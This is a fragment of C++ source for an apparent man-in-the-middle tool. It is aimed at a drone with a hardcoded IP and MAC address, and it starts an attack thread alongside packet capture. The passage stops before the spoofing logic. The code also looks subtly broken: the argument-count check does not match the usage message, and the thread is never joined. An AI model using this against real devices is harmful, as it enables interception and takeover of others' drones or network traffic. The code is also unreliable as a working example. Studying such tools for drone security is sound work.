...
int main(int argc,char** argv){
	if(argc != 5){
		printf("usage: %s ipaddr macaddr\n", argv[0]);
		printf("Target host drone [%s] \n", "192.168.1.1/90:03:b7:90:e1:62");
		return -1;
	}

	std::thread mitm(mitm_attack, argv[1], argv[2]);
	capture(argv[1], "192.168.1.1");
}

void mitm_attack(const char* ip1, const char* mac1){
	const char* ip2 = "192.168.1.1";
	const char* mac2 = "90:03:b7:90:e1:62";
